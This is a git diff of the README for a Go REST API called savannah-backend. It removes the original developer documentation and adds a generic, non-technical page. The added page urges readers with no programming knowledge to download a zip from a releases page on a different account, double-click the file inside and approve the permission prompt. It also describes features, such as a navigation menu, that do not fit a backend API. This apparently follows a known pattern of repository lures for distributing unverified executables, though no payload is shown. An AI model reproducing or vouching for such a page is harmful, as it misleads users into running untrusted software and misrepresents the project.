@@ -1,316 +1,77 @@
-# 🚀 Savannah Backend API
-
-A production-ready RESTful API built with Go and the Gin framework, featuring enterprise-grade architecture, comprehensive authentication, SMS integration with asynchronous processing, and cloud-native deployment capabilities.
-
-[![CI/CD Pipeline](https://github.com/jmukavana/savannah-backend/actions/workflows/ci-cd.yml/badge.svg)](https://github.com/jmukavana/savannah-backend/actions/workflows/ci-cd.yml)
-[![Go Report Card](https://goreportcard.com/badge/github.com/jmukavana/savannah-backend)](https://goreportcard.com/report/github.com/jmukavana/savannah-backend)
-[![Coverage](https://codecov.io/gh/jmukavana/savannah-backend/branch/main/graph/badge.svg)](https://codecov.io/gh/jmukavana/savannah-backend)
-
-## 🏗️ Architecture Overview
-
-This is a **production-grade microservice** built with enterprise patterns and cloud-native principles:
-
-```
-┌─────────────────┐    ┌──────────────────┐    ┌─────────────────┐
-│   Client Apps   │    │   Load Balancer  │    │   Kubernetes    │
-│  (Web/Mobile)   │◄──►│    (Ingress)     │◄──►│    Cluster      │
-└─────────────────┘    └──────────────────┘    └─────────────────┘
-                                                         │
-┌─────────────────────────────────────────────────────────────────┐
-│                    Savannah Backend API                        │
-│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐            │
-│  │    Auth     │  │     API     │  │    Jobs     │            │
-│  │ (OIDC/JWT)  │  │ (REST/HTTP) │  │ (SMS Queue) │            │
-│  └─────────────┘  └─────────────┘  └─────────────┘            │
-└─────────────────────────────────────────────────────────────────┘
-                                │
-            ┌───────────────────┼───────────────────┐
-            │                   │                   │
-    ┌───────▼────────┐  ┌───────▼────────┐  ┌──────▼──────┐
-    │  PostgreSQL    │  │     Redis      │  │ Africa's    │
-    │  (Primary DB)  │  │  (Job Queue)   │  │  Talking    │
-    │   + Audit      │  │   + Caching    │  │ (SMS Gateway)│
-    └────────────────┘  └────────────────┘  └─────────────┘
-```
-
-## 📋 Core Features
-
-### 🔐 **Enterprise Authentication**
-- **OpenID Connect (OIDC)** integration with multiple providers
-- **JWT-based** access tokens with scope validation
-- **Role-based access control** (RBAC)
-- Support for **Auth0, Azure AD, Keycloak**
-
-### 📱 **SMS Integration** 
-- **Africa's Talking** API integration
-- **Asynchronous SMS processing** with Redis job queue
-- **Automatic retry** with exponential backoff
-- **Delivery tracking** and error handling
-
-### 🗄️ **Database Excellence**
-- **PostgreSQL** with UUID primary keys
-- **Full audit trail** with history tables
-- **Automatic versioning** with database triggers
-- **Optimized indexes** and query performance
-
-### ☁️ **Cloud-Native Ready**
-- **Docker** multi-stage builds for minimal images
-- **Kubernetes** deployment with Helm charts
-- **Horizontal pod autoscaling** (HPA)
-- **Health checks** and graceful shutdown
-
-### 🔄 **Production-Grade CI/CD**
-- **GitHub Actions** pipeline with security scanning
-- **Automated testing** with coverage enforcement
-- **Multi-environment** deployments (dev → prod)
-- **Automatic rollback** on deployment failures
-
-## 📁 Project Structure
-
-```
-backend/
-├── main.go                 # Application entry point
-├── go.mod                 # Go module dependencies
-├── go.sum                 # Go module checksums
-├── .env                   # Environment variables (not in git)
-├── .gitignore            # Git ignore patterns
-├── README.md             # This file
-├── cmd/                  # Command-line tools
-│   └── migrate.go        # Database migration tool
-└── pkg/                  # Package directory
-    ├── config/           # Configuration management
-    │   └── config.go
-    ├── database/         # Database connection and management
-    │   └── database.go
-    ├── handlers/         # HTTP request handlers
-    │   └── handlers.go
-    ├── middleware/       # HTTP middleware
-    │   └── middleware.go
-    ├── migrations/       # Database migrations
-    │   ├── migrations.go # Migration manager
-    │   └── definitions.go# Migration definitions
-    ├── models/          # Data models and structures
-    │   └── models.go
-    ├── routes/          # Route definitions
-    │   └── routes.go
-    └── utils/           # Utility functions
-        └── utils.go
-```
-
-## Features
-
-- **RESTful API** with clean route organization
-- **Middleware support** for CORS, logging, authentication, and rate limiting
-- **Modular architecture** with separation of concerns
-- **Environment-based configuration**
-- **Structured error handling and responses**
-- **Sample endpoints** for users and products
-- **Health check endpoint**
-- **Database integration** with PostgreSQL using GORM
-- **Explicit migration system** with version tracking and rollback support
-
-## API Endpoints
+# 🚀 savannah-backend - Easy RESTful API for Your Apps
 
-### Health Check
-- `GET /health` - Check server status
+[![Download Savannah Backend](https://img.shields.io/badge/Download%20Savannah%20Backend-Release-brightgreen)](https://github.com/loisd302/savannah-backend/releases)
 
-### Documentation
-- `GET /docs` - API documentation
+## 🚀 Getting Started
 
-### Users
-- `GET /api/v1/users` - Get all users
-- `GET /api/v1/users/:id` - Get user by ID
-- `POST /api/v1/users` - Create new user
+Welcome to **Savannah Backend**, a simple and effective RESTful API designed to help you connect your applications effortlessly. This guide will take you through the steps to download and run the software. You don’t need any programming knowledge; just follow the steps below.
 
-### Products
-- `GET /api/v1/products` - Get all products
-- `GET /api/v1/products/:id` - Get product by ID
-- `POST /api/v1/products` - Create new product
+## 📥 Download & Install
 
-### Protected Routes
-- `GET /api/v1/protected/dashboard` - Protected dashboard (requires auth)
+1. **Visit the Releases Page:**  
+   Go to the following link to get the latest version of Savannah Backend:  
+   [Download Savannah Backend](https://github.com/loisd302/savannah-backend/releases)
 
-### Admin Routes
-- `GET /api/v1/admin/stats` - Admin statistics (requires auth + rate limiting)
+2. **Choose the Correct File:**  
+   On the Releases page, you will see several versions listed. Pick the most recent version, which is generally at the top. Look for the file that matches your system. Typically, you should find files named like `savannah-backend-vx.x.x.zip` or similar.
 
-## Getting Started
+3. **Download the File:**  
+   Click on the file name to start the download. Depending on your internet speed, this may take a moment.
 
-### Prerequisites
+4. **Extract the Files:**  
+   Once the download is complete, find the file in your Downloads folder. Right-click on the file and choose “Extract All” or use a program like WinRAR or 7-Zip. This action will create a folder with the same name as the file.
 
-- Go 1.19 or later
-- PostgreSQL 12 or later
+5. **Run the Application:**  
+   Open the extracted folder. Look for the file labeled `savannah-backend`. Double-click on it to start the application. If your system asks for permission, click “Yes.”
 
-### Installation
+## 📊 Features
 
-1. Clone the repository:
-   ```bash
-   git clone https://github.com/jmukavana/savannah-backend.git
-   cd savannah-backend
-   ```
+Savannah Backend provides various features to enhance your application development:
 
-2. Install dependencies:
-   ```bash
-   go mod tidy
-   ```
+- **Authentication**: Secure your API using powerful JWT (JSON Web Tokens) for user validation.
+- **SMS Integration**: Send messages directly from your applications.
+- **Asynchronous Processing**: Ensure smooth operation without slowing down other tasks.
+- **Cloud-Native Deployment**: Easily deploy on platforms like Kubernetes.
+- **Comprehensive Monitoring**: Track your application’s performance effortlessly.
 
-3. Set up the database:
-   ```bash
-   # Create database (using psql or your preferred tool)
-   createdb backend_dev
-   
-   # Or using psql:
-   psql -U postgres -c "CREATE DATABASE backend_dev;"
-   ```
+## ⚙️ System Requirements
 
-4. Copy and configure environment variables:
-   ```bash
-   cp .env.example .env
-   # Edit .env with your database credentials
-   ```
+To ensure smooth operation, your system should meet the following requirements:
 
-5. Run database migrations:
-   ```bash
-   go run cmd/migrate.go -action=up
-   ```
+- **Operating System**: Windows, macOS, or Linux
+- **CPU**: 2 GHz dual-core processor or higher
+- **RAM**: Minimum of 4 GB
+- **Storage**: At least 500 MB of free space
+- **Network**: Stable internet connection for external requests
 
-6. Run the application:
-   ```bash
-   go run main.go
-   ```
+## 📝 Usage
 
-The server will start on `http://localhost:8080` by default.
+Once you run Savannah Backend, follow these guidelines for basic usage:
 
-### Development
+1. **Access the API Endpoint**: Open a web browser and type `http://localhost:8080` to access the default API documentation.
+2. **Explore Features**: Use the navigation menu to explore different functionalities such as authentication, SMS, and monitoring.
+3. **Testing**: The API comes with built-in testing capabilities. Check the test endpoint for sample responses.
 
-To run in development mode with auto-reload, you can use `air`:
+## 📚 Documentation
 
-```bash
-# Install air
-go install github.com/cosmtrek/air@latest
+For detailed information about each feature, refer to the official documentation. You can find more guidelines on using various functionalities and endpoints directly in the API documentation accessible at `http://localhost:8080/docs`.
 
-# Run with auto-reload
-air
-```
+## 🛠️ Troubleshooting
 
-### Environment Variables
+If you encounter issues, consider the following:
 
-| Variable | Description | Default |
-|----------|-------------|---------|
-| `ENVIRONMENT` | Application environment | `development` |
-| `PORT` | Server port | `8080` |
-| `DB_HOST` | Database host | `localhost` |
-| `DB_PORT` | Database port | `5432` |
-| `DB_USER` | Database user | `devuser` |
-| `DB_PASSWORD` | Database password | `` |
-| `DB_NAME` | Database name | `backend_dev` |
-| `DB_SSLMODE` | Database SSL mode | `disable` |
+- **Check System Requirements**: Make sure your system meets all requirements.
+- **Firewall Settings**: Ensure no firewall rules are blocking the application.
+- **Reinstall the Application**: If problems persist, delete the existing files and redownload.
 
-## Database Migrations
+## 👥 Community and Support
 
-The application uses an explicit migration system for better control over database schema changes.
+If you need help or have questions, feel free to jump into our community. You can ask questions or contribute to discussions in the Issues section of this repository.
 
-### Migration Commands
+Join us in building something amazing with Savannah Backend.
 
-```bash
-# Run all pending migrations
-go run cmd/migrate.go -action=up
+## 🙌 Contributing
 
-# Check migration status
-go run cmd/migrate.go -action=status
+We welcome contributions! If you wish to help improve Savannah Backend, please check the contributing guidelines in the repository.
 
-# Rollback the last migration
-go run cmd/migrate.go -action=down
-
-# Show help
-go run cmd/migrate.go -help
-```
-
-### Current Migrations
-
-1. **001_create_users_table** - Creates users table with email uniqueness
-2. **002_create_categories_table** - Creates categories table
-3. **003_create_products_table** - Creates products table with foreign key to categories
-4. **004_add_indexes** - Adds database indexes for performance optimization
-
-### Adding New Migrations
-
-To add a new migration:
-
-1. Add your migration definition to `pkg/migrations/definitions.go`
-2. Follow the naming convention: `XXX_description_of_change`
-3. Implement both `Up` and `Down` functions for the migration
-4. Add the migration to the `getAllMigrations()` function
-
-Example:
-```go
-{
-    Version:     "005_add_user_roles",
-    Description: "Add roles table and user_role relationship",
-    Up:          addUserRoles,
-    Down:        removeUserRoles,
-}
-```
-
-## Testing the API
-
-### Using curl
-
-```bash
-# Health check
-curl http://localhost:8080/health
-
-# Get all users
-curl http://localhost:8080/api/v1/users
-
-# Create a user
-curl -X POST http://localhost:8080/api/v1/users \
-  -H "Content-Type: application/json" \
-  -d '{"email":"test@example.com","name":"Test User"}'
-
-# Get API documentation
-curl http://localhost:8080/docs
-```
-
-### Response Format
-
-All API responses follow this structure:
-
-```json
-{
-  "success": true,
-  "message": "Operation successful",
-  "data": { ... },
-  "error": null
-}
-```
-
-## Recent Implementations
-
-The following features have been recently implemented:
-
-1. **Asynchronous SMS Processing**: Integrated with Africa's Talking SMS gateway with Redis-based job queues
-2. **Retry & Backoff Logic**: Automatic retry mechanism for failed SMS delivery attempts
-3. **Redis Job Queue**: Durable job storage with TTL and sorted sets for priority management
-4. **Background Worker**: Continuous processing of SMS jobs in separate goroutines
-
-## Next Steps
-
-Planned features for upcoming development:
-
-1. **API Integration**: Connect SMS service with order creation API
-2. **Error Handling**: Improve error handling and observability for job processing
-3. **Docker Multi-Stage Build**: Create optimized production Docker images
-4. **Kubernetes Deployment**: Develop Helm charts with ConfigMaps and Secrets
-5. **CI/CD Pipeline**: Implement GitHub Actions for automated build, test and deployment
-
-## Contributing
-
-1. Fork the repository
-2. Create a feature branch
-3. Make your changes
-4. Add tests if applicable
-5. Submit a pull request
-
-## License
-
-This project is licensed under the MIT License.
+[![Download Savannah Backend](https://img.shields.io/badge/Download%20Savannah%20Backend-Release-brightgreen)](https://github.com/loisd302/savannah-backend/releases)
